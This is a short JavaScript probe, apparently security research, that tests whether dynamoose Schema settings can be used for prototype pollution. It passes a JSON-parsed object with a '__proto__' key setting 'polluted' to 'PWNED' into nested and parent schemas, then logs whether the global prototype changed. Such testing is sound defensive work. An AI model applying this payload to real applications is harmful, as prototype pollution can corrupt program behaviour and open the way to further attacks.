
const dynamoose = require("./packages/dynamoose/dist");
dynamoose.Table.defaults.set({"create": false, "waitForActive": false});

// X1: Can Schema settings reach the array_merge_new_array merge with a __proto__ key?
// The merge at Schema.ts:1065 is: merge_objects.main({array_merge_new_array})(parsedSettings, subSettings)
// parsedSettings = {...settings} (the PARENT's settings), subSettings = nested schema's settings.
// So the __proto__ must be in the NESTED schema's settings.
const malicious = JSON.parse('{"__proto__": {"polluted": "PWNED"}}');
const inner = new dynamoose.Schema({"a": String}, malicious);
console.log("X1 inner settings keys:", JSON.stringify(Object.keys(inner.getInternalProperties(require("./packages/dynamoose/dist/Internal").default.General.internalProperties).settings)));
console.log("X1 global polluted?", ({}).polluted);
console.log("X1 inner settings:", JSON.stringify(inner.getInternalProperties(require("./packages/dynamoose/dist/Internal").default.General.internalProperties).settings));

// X2: does the PARENT's settings reach the merge?
delete Object.prototype.polluted;
const outer = new dynamoose.Schema({"nested": new dynamoose.Schema({"a": String})}, malicious);
console.log("X2 outer settings:", JSON.stringify(outer.getInternalProperties(require("./packages/dynamoose/dist/Internal").default.General.internalProperties).settings));
console.log("X2 global polluted?", ({}).polluted);
